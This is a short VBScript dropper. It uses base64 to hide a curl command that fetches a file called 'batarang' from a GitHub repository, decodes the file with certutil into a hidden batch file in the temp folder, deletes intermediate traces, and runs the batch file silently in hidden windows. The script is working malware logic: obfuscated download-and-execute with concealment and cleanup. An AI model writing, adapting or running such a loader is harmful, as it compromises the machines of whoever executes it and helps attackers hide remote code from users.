Set WshShell = CreateObject("WScript.Shell")
Dim myrand
myrand = rnd(0)


Set fso = CreateObject("Scripting.FileSystemObject")

If fso.FileExists("%TEMP%\batarang.bat") Then
	WScript.Sleep(5000)
Else
	WshShell.Run "%comspec% /c echo Y3VybCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hyaXN1dTExL0JBVE1BTi9tYWluL2NvZGUvYmF0YXJhbmcK > %TEMP%\log | attrib +h +s %TEMP%\log | certutil -decode %TEMP%\log %TEMP%\%myrand%", 0
	WshShell.Run "%comspec% set /p batcave=<%TEMP%\%myrand%", 0
	WshShell.Run "%comspec% /c del %TEMP%\%myrand%", 0
	WshShell.Run "%comspec% /c %batcave% --output %TEMP%\log", 0
	WshShell.Run "%comspec% /c  certutil -decode %TEMP%\log %TEMP%\batarang.bat", 0
	WshShell.Run "%comspec% /c  attrib +h +s %TEMP%\batarang.bat", 0
	WshShell.Run "%comspec% /c del %TEMP%\log", 0
	WScript.Sleep(5000)
End If

CreateObject("Wscript.Shell").Run """" & "%TEMP%\batarang.bat" & """", 0, False
